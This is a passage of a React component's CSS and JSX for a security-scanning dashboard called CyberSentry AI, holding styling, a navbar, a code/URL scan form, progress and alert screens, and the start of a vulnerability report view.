        .vuln-name{font-size:20px;font-weight:700;color:#fff;letter-spacing:-0.02em}
        .vuln-line{font-family:'JetBrains Mono',monospace;font-size:10px;color:rgba(255,255,255,0.22);background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);padding:4px 10px;border-radius:6px}
        .expand-chevron{transition:transform 0.3s ease;display:flex}
        .expand-chevron.rotated{transform:rotate(90deg)}
        .vuln-short-desc{font-size:13px;color:rgba(255,255,255,0.45);line-height:1.6;margin-bottom:12px}
        .expand-hint{background:none;border:1px solid rgba(255,255,255,0.06);border-radius:6px;padding:7px 14px;color:rgba(255,255,255,0.25);font-size:11px;font-family:'JetBrains Mono',monospace;cursor:pointer;display:flex;align-items:center;gap:7px;transition:all 0.2s;margin-top:4px}
        .expand-hint:hover{color:rgba(0,255,136,0.7);border-color:rgba(0,255,136,0.2)}
        .vuln-expand-body{max-height:0;overflow:hidden;transition:max-height 0.5s cubic-bezier(0.16,1,0.3,1)}
        .vuln-expand-body.open{max-height:3000px}
        .vuln-sections{display:flex;flex-direction:column;gap:14px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.05);margin-top:4px}
        .vuln-sec-full{display:flex;flex-direction:column;gap:8px}
        .vsec-label{display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em}
        .vsec-content{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:16px 18px;font-size:13.5px;line-height:1.85;color:rgba(255,255,255,0.68)}
        .copy-fix-btn{display:inline-flex;align-items:center;gap:7px;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.16);color:#00ff88;font-size:11px;font-weight:700;padding:6px 14px;border-radius:7px;cursor:pointer;transition:all 0.2s;font-family:'JetBrains Mono',monospace}
        .copy-fix-btn:hover{background:rgba(0,255,136,0.15)}
        .fix-all-trigger{display:inline-flex;align-items:center;gap:7px;background:rgba(124,58,237,0.08);border:1px solid rgba(124,58,237,0.2);color:#a78bfa;font-size:11px;font-weight:700;padding:6px 14px;border-radius:7px;cursor:pointer;transition:all 0.2s;font-family:'JetBrains Mono',monospace}
        .fix-all-trigger:hover{background:rgba(124,58,237,0.15)}

        /* ATTACK SIMULATION PANEL */
        .attack-panel{border:1px solid rgba(255,59,59,0.12);border-radius:10px;overflow:hidden;background:rgba(10,0,0,0.8)}
        .attack-panel.open{border-color:rgba(255,59,59,0.25)}
        .attack-panel-toggle{width:100%;padding:12px 16px;background:rgba(255,59,59,0.06);border:none;cursor:pointer;display:flex;align-items:center;gap:10px;color:#ff6b6b;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;transition:background 0.2s}
        .attack-panel-toggle:hover{background:rgba(255,59,59,0.1)}
        .attack-badge{margin-left:auto;background:rgba(255,59,59,0.15);color:#ff4444;font-size:9px;font-weight:800;padding:2px 8px;border-radius:4px;letter-spacing:0.12em}
        .attack-body{padding:20px}
        .attack-header-row{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:18px;gap:16px}
        .attack-title{font-family:'JetBrains Mono',monospace;font-size:15px;font-weight:700;color:#ff6b6b;margin-bottom:4px}
        .attack-sub{font-size:12px;color:rgba(255,255,255,0.3);font-family:'JetBrains Mono',monospace}
        .run-sim-btn{background:#ff3b3b;border:none;padding:8px 18px;border-radius:7px;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:12px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:7px;transition:all 0.2s;flex-shrink:0;box-shadow:0 0 14px rgba(255,59,59,0.22)}
        .run-sim-btn:hover{background:#ff5555;box-shadow:0 0 22px rgba(255,59,59,0.35)}
        .run-sim-btn.running{opacity:0.7;cursor:not-allowed}
        .sim-section{display:flex;flex-direction:column;gap:8px;margin-bottom:14px}
        .sim-section-label{display:flex;align-items:center;gap:7px;font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:0.12em;color:rgba(255,255,255,0.35)}
        .terminal-block{background:#000;border:1px solid rgba(255,255,255,0.07);border-radius:8px;overflow:hidden}
        .terminal-header{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);display:flex;align-items:center;gap:10px}
        .term-dots{display:flex;gap:6px}
        .td-r{width:10px;height:10px;border-radius:50%;background:#ff5f57}
        .td-y{width:10px;height:10px;border-radius:50%;background:#ffbd2e}
        .td-g{width:10px;height:10px;border-radius:50%;background:#28ca42}
        .term-title{font-family:'JetBrains Mono',monospace;font-size:11px;color:rgba(255,255,255,0.35)}
        .terminal-code{padding:16px;font-family:'JetBrains Mono',monospace;font-size:12.5px;color:#00ff88;line-height:1.75;overflow-x:auto;white-space:pre}
        .attack-steps{display:flex;flex-direction:column;gap:8px}
        .attack-step{display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:10px 14px;animation:slideIn 0.3s ease both}
        .attack-step.running{border-color:rgba(255,59,59,0.2);background:rgba(255,59,59,0.04)}
        .step-num{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:rgba(255,255,255,0.25);flex-shrink:0}
        .step-text{font-size:13px;color:rgba(255,255,255,0.65);flex:1}
        .spin-dot{width:14px;height:14px;border-radius:50%;border:2px solid rgba(0,255,136,0.3);border-top-color:#00ff88;animation:spin 0.8s linear infinite;flex-shrink:0}
        .sim-2col{display:grid;grid-template-columns:1fr 1fr;gap:14px}
        .sim-box{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:14px 16px;font-size:13px;line-height:1.75;color:rgba(255,255,255,0.62)}

        /* REASONING PANEL */
        .reasoning-panel{border:1px solid rgba(96,165,250,0.12);border-radius:10px;overflow:hidden;background:rgba(0,0,5,0.8)}
        .reasoning-panel.open{border-color:rgba(96,165,250,0.25)}
        .reasoning-toggle{width:100%;padding:12px 16px;background:rgba(96,165,250,0.06);border:none;cursor:pointer;display:flex;align-items:center;gap:10px;color:#60a5fa;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;transition:background 0.2s}
        .reasoning-toggle:hover{background:rgba(96,165,250,0.1)}
        .reasoning-badge{margin-left:auto;background:rgba(96,165,250,0.12);color:#60a5fa;font-size:9px;font-weight:800;padding:2px 8px;border-radius:4px;letter-spacing:0.12em}
        .reasoning-body{padding:20px}
        .reasoning-header{margin-bottom:18px}
        .reasoning-title{font-family:'JetBrains Mono',monospace;font-size:15px;font-weight:700;color:#60a5fa;margin-bottom:4px}
        .reasoning-sub{font-size:12px;color:rgba(255,255,255,0.3);font-family:'JetBrains Mono',monospace}
        .reasoning-steps{display:flex;flex-direction:column;gap:0}
        .reasoning-step{display:flex;gap:14px;position:relative;animation:slideInLeft 0.4s ease both}
        .rs-connector{width:28px;display:flex;flex-direction:column;align-items:center;flex-shrink:0;padding-top:4px}
        .rs-line{width:2px;flex:1;min-height:20px;margin-top:6px;opacity:0.4}
        .rs-icon-col{flex-shrink:0}
        .rs-icon{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
        .rs-content{flex:1;padding-bottom:20px}
        .rs-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;margin-bottom:4px}
        .rs-detail{font-size:12px;color:rgba(255,255,255,0.3);margin-bottom:8px;font-family:'JetBrains Mono',monospace;line-height:1.5}
        .rs-finding{font-size:13px;color:rgba(255,255,255,0.72);line-height:1.7;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:10px 14px}
        .rs-finding-prefix{color:#00ff88;font-weight:700}
        .cursor-blink{animation:blink 1s infinite;color:#00ff88}
        .reasoning-loading{display:flex;align-items:center;gap:10px;padding:10px 0;color:rgba(255,255,255,0.3);font-size:12px;font-family:'JetBrains Mono',monospace}
        .reasoning-summary{display:flex;align-items:center;gap:10px;background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.12);border-radius:8px;padding:12px 16px;font-size:13px;color:rgba(255,255,255,0.6);font-family:'JetBrains Mono',monospace;margin-top:8px}

        /* FIX ALL MODAL */
        .fix-all-modal{background:#0a0a0a;border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:0;max-width:640px;width:100%;max-height:85vh;overflow-y:auto;box-shadow:0 0 100px rgba(0,0,0,0.8)}
        .fix-all-modal::-webkit-scrollbar{width:4px}
        .fix-all-modal::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:4px}
        .fam-header{padding:24px 28px;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;align-items:flex-start;justify-content:space-between;background:rgba(255,255,255,0.01);position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}
        .fam-title{display:flex;align-items:center;gap:10px;font-family:'JetBrains Mono',monospace;font-size:16px;font-weight:700;color:#fff;margin-bottom:4px}
        .fam-sub{font-size:12px;color:rgba(255,255,255,0.3);font-family:'JetBrains Mono',monospace}
        .fam-close{background:none;border:none;color:rgba(255,255,255,0.3);cursor:pointer;padding:4px;border-radius:6px;transition:all 0.2s;display:flex}
        .fam-close:hover{color:#fff;background:rgba(255,255,255,0.06)}
        .fam-scanning{padding:40px;display:flex;flex-direction:column;align-items:center;gap:16px;text-align:center}
        .fam-scan-text{font-family:'JetBrains Mono',monospace;font-size:14px;color:rgba(255,255,255,0.5)}
        .fam-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;padding:24px 28px;border-bottom:1px solid rgba(255,255,255,0.06)}
        .fam-stat-box{background:#080808;border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:16px;text-align:center}
        .fam-stat-num{font-family:'JetBrains Mono',monospace;font-size:28px;font-weight:700;line-height:1}
        .fam-stat-label{font-size:11px;color:rgba(255,255,255,0.3);font-family:'JetBrains Mono',monospace;margin-top:6px;text-transform:uppercase;letter-spacing:0.08em}
        .fam-matches{padding:20px 28px;display:flex;flex-direction:column;gap:12px}
        .fam-match{background:#080808;border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:16px;animation:slideInUp 0.3s ease both}
        .fam-match-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
        .fam-file{display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:12px;color:rgba(255,255,255,0.55)}
        .fam-line-tag{font-family:'JetBrains Mono',monospace;font-size:10px;color:rgba(255,255,255,0.25);background:rgba(255,255,255,0.04);padding:3px 8px;border-radius:4px}
        .fam-diff-mini{display:flex;flex-direction:column;gap:4px}
        .fam-before,.fam-after{display:flex;align-items:flex-start;gap:8px;padding:6px 10px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:12px}
        .fam-before{background:rgba(255,59,59,0.07);color:#fca5a5}
        .fam-after{background:rgba(0,255,136,0.06);color:#6ee7b7}
        .fam-marker{font-weight:800;font-size:14px;flex-shrink:0;line-height:1.4}
        .fam-marker.red{color:#ff4444}
        .fam-marker.green{color:#00ff88}
        .fam-actions{padding:20px 28px;border-top:1px solid rgba(255,255,255,0.06);display:flex;gap:12px;justify-content:flex-end}
        .fam-cancel{background:none;border:1px solid rgba(255,255,255,0.08);padding:10px 20px;border-radius:8px;color:rgba(255,255,255,0.4);font-family:'Space Grotesk',sans-serif;font-size:13px;font-weight:600;cursor:pointer;transition:all 0.15s}
        .fam-cancel:hover{background:rgba(255,255,255,0.04);color:#fff}
        .fam-apply{background:#00ff88;border:none;padding:10px 22px;border-radius:8px;color:#000;font-family:'Space Grotesk',sans-serif;font-size:13px;font-weight:800;cursor:pointer;display:flex;align-items:center;gap:8px;transition:all 0.2s;box-shadow:0 0 18px rgba(0,255,136,0.22)}
        .fam-apply:hover{background:#1aff95}
        .fam-apply:disabled{opacity:0.5;cursor:not-allowed}
        .fam-done{padding:40px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:12px}
        .fam-done-icon{width:72px;height:72px;border-radius:20px;background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);display:flex;align-items:center;justify-content:center}
        .fam-done-title{font-family:'JetBrains Mono',monospace;font-size:20px;font-weight:700;color:#00ff88}
        .fam-done-sub{font-size:14px;color:rgba(255,255,255,0.4);line-height:1.6;max-width:400px}

        /* EMPTY / ORIGINAL / DIFF */
        .vuln-empty{padding:72px 28px;display:flex;flex-direction:column;align-items:center;gap:14px;text-align:center}
        .ve-icon{width:64px;height:64px;border-radius:16px;display:flex;align-items:center;justify-content:center;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.15);color:#00ff88;animation:float 3s ease-in-out infinite}
        .ve-h{font-family:'JetBrains Mono',monospace;font-size:20px;font-weight:700;color:#fff}
        .ve-p{font-size:13px;color:rgba(255,255,255,0.28);max-width:320px;line-height:1.6}
        .orig-panel{padding:24px 28px}
        .code-viewer{background:#000;border:1px solid rgba(255,255,255,0.06);border-radius:12px;overflow:hidden}
        .cv-header{padding:12px 18px;border-bottom:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);display:flex;align-items:center;justify-content:space-between}
        .cv-left{display:flex;align-items:center;gap:8px}
        .cv-dot{width:6px;height:6px;border-radius:50%;background:#00ff88;box-shadow:0 0 6px #00ff88}
        .cv-title{font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;color:rgba(255,255,255,0.35);text-transform:uppercase;letter-spacing:0.12em}
        .cv-lang{font-family:'JetBrains Mono',monospace;font-size:11px;color:#00ff88;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.15);padding:3px 10px;border-radius:5px;font-weight:700}
        .code-viewer pre{padding:22px;font-family:'JetBrains Mono',monospace;font-size:13px;color:rgba(255,255,255,0.62);line-height:1.75;overflow-x:auto;max-height:520px}
        .corr-panel{padding:24px 28px;display:flex;flex-direction:column;gap:18px}
        .diff-title-row{display:flex;align-items:center;justify-content:space-between}
        .diff-title{font-family:'JetBrains Mono',monospace;font-size:18px;font-weight:700;color:#fff}
        .diff-sub{font-size:11px;color:rgba(255,255,255,0.22);font-family:'JetBrains Mono',monospace;margin-top:5px}
        .auto-badge{display:inline-flex;align-items:center;gap:7px;background:rgba(0,255,136,0.07);border:1px solid rgba(0,255,136,0.16);color:#00ff88;font-size:11px;font-weight:700;padding:6px 12px;border-radius:6px;font-family:'JetBrains Mono',monospace}
        .diff-root{border:1px solid rgba(255,255,255,0.06);border-radius:12px;overflow:hidden}
        .diff-top-bar{display:grid;grid-template-columns:1fr 1fr;border-bottom:1px solid rgba(255,255,255,0.06)}
        .diff-top-side{padding:11px 16px;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;display:flex;align-items:center;gap:8px}
        .diff-top-vuln{background:rgba(255,59,59,0.05);color:#ff6b6b;border-right:1px solid rgba(255,255,255,0.05)}
        .diff-top-fixed{background:rgba(0,255,136,0.04);color:#00ff88;justify-content:space-between}
        .dtd{width:7px;height:7px;border-radius:50%}
        .dtd.red{background:#ef4444}
        .dtd.green{background:#00ff88;box-shadow:0 0 6px #00ff88}
        .copy-patch-btn{display:flex;align-items:center;gap:5px;background:rgba(0,255,136,0.09);border:1px solid rgba(0,255,136,0.18);color:#00ff88;font-size:10px;font-weight:700;padding:3px 9px;border-radius:5px;cursor:pointer;font-family:'JetBrains Mono',monospace}
        .copy-patch-btn:hover{background:rgba(0,255,136,0.17)}
        .diff-cols{display:grid;grid-template-columns:1fr 1fr}
        .diff-col{overflow-x:auto;max-height:460px;overflow-y:auto}
        .diff-col::-webkit-scrollbar{width:3px}
        .diff-col::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.07);border-radius:4px}
        .diff-col-left{background:#070004;border-right:1px solid rgba(255,255,255,0.04)}
        .diff-col-right{background:#020800}
        .dl{display:flex;min-height:22px}
        .dl-bad{background:rgba(255,59,59,0.08);border-left:2px solid rgba(255,59,59,0.45)}
        .dl-good{background:rgba(0,255,136,0.06);border-left:2px solid rgba(0,255,136,0.35)}
        .dl-ln{min-width:38px;padding:2px 10px 2px 8px;font-family:'JetBrains Mono',monospace;font-size:11px;color:rgba(255,255,255,0.12);text-align:right;user-select:none;flex-shrink:0;border-right:1px solid rgba(255,255,255,0.04)}
        .dl-code{padding:2px 14px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.75;color:rgba(255,255,255,0.42)}
        .dl-bad .dl-code{color:#fca5a5}
        .dl-good .dl-code{color:#6ee7b7}

        /* SENTRY AI */
        .sentry-panel{padding:24px 28px 0;display:flex;flex-direction:column;gap:16px}
        .sentry-banner{background:#000;border:1px solid rgba(0,255,136,0.13);border-radius:10px;padding:13px 18px;display:flex;align-items:center;gap:12px;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:600;color:rgba(255,255,255,0.55)}
        .sentry-orb{width:28px;height:28px;border-radius:50%;background:#00ff88;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:#000;box-shadow:0 0 12px rgba(0,255,136,0.35);flex-shrink:0}
        .chat-wrap{background:#000;border:1px solid rgba(255,255,255,0.06);border-radius:12px;overflow:hidden;display:flex;flex-direction:column}
        .chat-head{padding:13px 18px;border-bottom:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.01);display:flex;align-items:center;justify-content:space-between}
        .chat-head-l{display:flex;align-items:center;gap:10px}
        .chat-head-title{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.12em;color:rgba(255,255,255,0.38)}
        .neural-live{display:flex;align-items:center;gap:6px}
        .neural-dot{width:6px;height:6px;border-radius:50%;background:#00ff88;box-shadow:0 0 6px #00ff88;animation:blink 1.8s infinite}
        .neural-txt{font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;color:rgba(255,255,255,0.22);text-transform:uppercase;letter-spacing:0.1em}
        .chat-msgs{height:360px;overflow-y:auto;padding:20px 18px;display:flex;flex-direction:column;gap:14px;scroll-behavior:smooth}
        .chat-msgs::-webkit-scrollbar{width:3px}
        .chat-msgs::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.07);border-radius:4px}
        .chat-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:10px;color:rgba(255,255,255,0.14);text-align:center}
        .chat-empty p{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.1em}
        .msg-bot{align-self:flex-start;max-width:92%;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:2px 14px 14px 14px;padding:14px 18px;font-size:14px;line-height:1.8;color:rgba(255,255,255,0.8);animation:msgSlide 0.3s ease}
        .msg-user{align-self:flex-end;max-width:78%;background:rgba(0,255,136,0.09);border:1px solid rgba(0,255,136,0.16);border-radius:14px 14px 2px 14px;padding:12px 16px;font-size:14px;line-height:1.6;color:#d1fae5;font-weight:500;animation:msgSlide 0.2s ease}
        .typing{display:flex;gap:5px;align-items:center;padding:4px 0}
        .td{width:6px;height:6px;border-radius:50%;background:#00ff88;animation:bounce 1.2s infinite}
        .td:nth-child(2){animation-delay:0.15s}
        .td:nth-child(3){animation-delay:0.3s}
        .suggestions{display:flex;flex-wrap:wrap;gap:8px;padding:12px 18px;border-top:1px solid rgba(255,255,255,0.04);background:rgba(0,0,0,0.3)}
        .suggest-btn{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);border-radius:20px;padding:6px 14px;font-size:12px;color:rgba(255,255,255,0.45);font-family:'Space Grotesk',sans-serif;cursor:pointer;transition:all 0.2s;white-space:nowrap}
        .suggest-btn:hover{background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.2);color:#00ff88;transform:translateY(-1px)}
        .chat-input-row{padding:14px 18px;border-top:1px solid rgba(255,255,255,0.05);background:rgba(0,0,0,0.5);display:flex;gap:10px}
        .chat-inp{flex:1;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);border-radius:8px;padding:10px 14px;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:13px;outline:none;transition:border-color 0.2s}
        .chat-inp::placeholder{color:rgba(255,255,255,0.18)}
        .chat-inp:focus{border-color:rgba(0,255,136,0.3)}
        .chat-send{width:40px;height:40px;border-radius:8px;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all 0.2s;flex-shrink:0}
        .chat-send.on{background:#00ff88;color:#000;box-shadow:0 0 14px rgba(0,255,136,0.28)}
        .chat-send.on:hover{background:#1aff95;transform:scale(1.08)}
        .chat-send.off{background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.14);cursor:not-allowed}

        /* MISC */
        .back-btn{background:none;border:none;color:rgba(255,255,255,0.25);font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:7px;padding:0;margin-bottom:20px;transition:color 0.2s}
        .back-btn:hover{color:#00ff88}
        .vulns-panel-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
        .vulns-panel-title{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:700;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:0.08em}

        /* KEYFRAMES */
        @keyframes ripple{0%{transform:scale(0);opacity:0.6}100%{transform:scale(4);opacity:0}}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
        @keyframes scanPulse{0%,100%{box-shadow:0 0 40px rgba(0,255,136,0.14)}50%{box-shadow:0 0 60px rgba(0,255,136,0.3)}}
        @keyframes slideIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
        @keyframes slideInLeft{from{opacity:0;transform:translateX(-16px)}to{opacity:1;transform:translateX(0)}}
        @keyframes slideInUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
        @keyframes fadeDown{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:translateY(0)}}
        @keyframes popUp{0%{opacity:0;transform:scale(0.9)}100%{opacity:1;transform:scale(1)}}
        @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
        @keyframes bounce{0%,80%,100%{transform:translateY(0)}40%{transform:translateY(-6px)}}
        @keyframes ticker{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
        @keyframes msgSlide{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        @keyframes expandWidth{from{width:0}to{width:70%}}
      `}</style>

      <div className="page-root">
        {/* TICKER */}
        <div className="ticker-wrap"><div className="ticker-track">{[...TICKER, ...TICKER].map((item, i) => (<span key={i} className="ticker-item"><span className="t-dot" />{item.label}: <span className="t-val">{item.val}</span></span>))}</div></div>

        {/* NAVBAR */}
        <nav className="dash-nav">
          <div className="nav-left">
            <div className="brand" onClick={() => router.push('/')}><div className="brand-icon"><Shield size={15} color="#00ff88" /></div><span className="brand-name">CyberSentry</span><span className="brand-ai">AI</span></div>
            <div className="nav-pill"><div className="green-dot" /><Home size={11} /> Dashboard</div>
          </div>
          <div style={{ position: 'relative' }}>
            <div className="user-pill" onClick={() => setProfileOpen(!profileOpen)}><div className="u-avatar">{username[0]}</div><span className="u-name">{username}</span><ChevronDown size={13} color="rgba(255,255,255,0.28)" style={{ transition: 'transform 0.2s', transform: profileOpen ? 'rotate(180deg)' : 'none' }} /></div>
            {profileOpen && (<div className="drop-menu"><div className="drop-head"><div className="drop-label">Signed in as</div><div className="drop-email">{user?.email}</div></div><button className="drop-item" onClick={() => setProfileOpen(false)}><Home size={13} color="#00ff88" /> Dashboard</button><button className="drop-item" onClick={() => setProfileOpen(false)}><Settings size={13} /> Settings</button><button className="drop-item danger" onClick={signOut}><LogOut size={13} /> Sign Out</button></div>)}
          </div>
        </nav>

        {/* MAIN */}
        <main className="page-main">
          {phase === 'idle' && (<>
            <div className="hero"><div className="hero-eyebrow"><div className="green-dot" /> System Active</div><h1 className="hero-h1">Welcome back, <span className="hero-accent">{username}</span></h1><p className="hero-sub">Your security command center. Run scans, track vulnerabilities, simulate attacks, and let AI patch your code.</p></div>
            <div className="stats-row">{[{ icon: <Terminal size={16} />, color: '#00ff88', bg: 'rgba(0,255,136,0.08)', label: 'Total Scans', val: stats.total }, { icon: <Bug size={16} />, color: '#ff6b6b', bg: 'rgba(255,107,107,0.08)', label: 'Vulnerabilities', val: stats.vulns }, { icon: <AlertTriangle size={16} />, color: '#f97316', bg: 'rgba(249,115,22,0.08)', label: 'Critical / High', val: stats.crit }, { icon: <Zap size={16} />, color: '#00ff88', bg: 'rgba(0,255,136,0.08)', label: 'Auto-Patched', val: stats.patched }].map((s, i) => (<div className="stat-card" key={i}><div className="stat-icon" style={{ background: s.bg, color: s.color }}>{s.icon}</div><AnimatedCounter target={s.val} /><div className="stat-label">{s.label}</div></div>))}</div>
            <div className="scanner-card">
              <div className="sc-tabs"><div className={`sc-tab ${scanMode === 'code' ? 'on' : ''}`} onClick={() => setScanMode('code')}><Code size={13} /> Paste Code</div><div className={`sc-tab ${scanMode === 'url' ? 'on' : ''}`} onClick={() => setScanMode('url')}><Globe size={13} /> Website URL</div></div>
              <div className="sc-body">
                {scanMode === 'code' ? (<><label className="sc-label">Programming Language</label><select className="sc-select" value={language} onChange={e => handleLanguageChange(e.target.value)}>{Object.keys(CODE_SAMPLES).map(l => <option key={l}>{l}</option>)}</select><label className="sc-label">Paste your code</label><textarea className="code-ta" value={code} onChange={e => setCode(e.target.value)} spellCheck={false} /></>) : (<><label className="sc-label">Website URL</label><input className="sc-select" style={{ marginBottom: 10 }} placeholder="https://example.com" value={code} onChange={e => setCode(e.target.value)} /><p className="url-hint">Enter the full URL to scan for network-level vulnerabilities.</p></>)}
                <RippleBtn className="scan-btn" onClick={startScan} disabled={!code.trim()}><Sparkles size={15} /> Start Security Scan</RippleBtn>
              </div>
            </div>
          </>)}

          {phase === 'scanning' && (
            <div className="scan-screen"><div className="scan-orb"><Sparkles size={30} color="#00ff88" /></div><div><h2 className="scan-h">Scanning in Progress</h2><p className="scan-s">Analyzing for vulnerabilities — please wait</p></div><div className="scan-steps">{scanSteps.map((s, i) => (<div key={i} className="scan-step" style={{ animationDelay: `${i * 0.07}s` }}><div className="step-pip" />{s}<CheckCircle size={12} color="#00ff88" style={{ marginLeft: 'auto', opacity: 0.7 }} /></div>))}</div><div className="prog-rail"><div className="prog-fill" style={{ width: `${scanProgress}%` }} /></div><div className="prog-label">{scanProgress}% complete</div></div>
          )}

          {phase === 'alert' && (
            <div className="modal-bg"><div className="alert-card"><button className="alert-close" onClick={() => setPhase('report')}>✕</button><div className="alert-icon"><Shield size={34} /></div><h2 className="alert-title">// THREAT DETECTED</h2><p className="alert-desc">Found <strong style={{ color: '#fff' }}>{vulns.filter(v => v.severity === 'critical').length} critical</strong> and <strong style={{ color: '#fff' }}>{vulns.filter(v => v.severity === 'high').length} high</strong> severity vulnerabilities requiring immediate attention.</p><div className="alert-chip"><AlertTriangle size={12} />{vulns.filter(v => v.severity === 'critical').length} Critical Issue{vulns.filter(v => v.severity === 'critical').length !== 1 ? 's' : ''} Found</div><RippleBtn className="alert-cta" onClick={() => setPhase('report')}>View Full Security Report →</RippleBtn></div></div>
          )}

          {phase === 'report' && (
            <div style={{ animation: 'fadeIn 0.3s ease' }}>
              <button className="back-btn" onClick={() => setPhase('idle')}>← Back to Dashboard</button>
              <div className="rep-header">
                <div>
                  <div className="rep-title-row"><div className="green-dot" /><h1 className="rep-title">// Scan Complete</h1></div>
                  <p className="rep-meta">Found {vulns.length} vulnerabilit{vulns.length === 1 ? 'y' : 'ies'} in 2.8s &nbsp;·&nbsp; {language}</p>
                  <div className="badge-row">{[{ l: 'critical', c: vulns.filter(v => v.severity === 'critical').length, col: '#ff4444', bg: 'rgba(255,68,68,0.08)' }, { l: 'high', c: vulns.filter(v => v.severity === 'high').length, col: '#f97316', bg: 'rgba(249,115,22,0.08)' }, { l: 'medium', c: vulns.filter(v => v.severity === 'medium').length, col: '#eab308', bg: 'rgba(234,179,8,0.08)' }, { l: 'low', c: 0, col: '#60a5fa', bg: 'rgba(96,165,250,0.08)' }].map((b, i) => (<div key={i} className="sev-badge" style={{ color: b.col, background: b.bg, borderColor: `${b.col}28` }}><div className="sev-dot" style={{ background: b.col }} />{b.c} {b.l}</div>))}</div>
                </div>
                <div className="btn-row" style={{ position: 'relative' }}>
                  <RippleBtn className="btn-green" onClick={() => setExportOpen(!exportOpen)}><Download size={13} /> Export & Share</RippleBtn>
                  {exportOpen && (<div className="exp-dd"><div className="exp-head">Select Export Format</div><button className="exp-item" onClick={() => { navigator.clipboard.writeText(JSON.stringify(vulns, null, 2)); setExportOpen(false) }}><div className="exp-ico" style={{ background: 'rgba(96,165,250,0.1)', color: '#60a5fa' }}><Copy size={13} /></div>Copy JSON Report</button><button className="exp-item" onClick={() => setExportOpen(false)}><div className="exp-ico" style={{ background: 'rgba(0,255,136,0.08)', color: '#00ff88' }}><Download size={13} /></div>Download PDF Brief</button><button className="exp-item" onClick={() => setExportOpen(false)}><div className="exp-ico" style={{ background: 'rgba(124,58,237,0.1)', color: '#a78bfa' }}><FileCode2 size={13} /></div>Open in VS Code</button></div>)}
                  <RippleBtn className="btn-ghost" onClick={() => setPhase('idle')}><RotateCcw size={13} /> New Scan</RippleBtn>
                </div>
              </div>

              <div className="rep-body" style={{ marginTop: 14 }}>
                <div className="tab-bar">
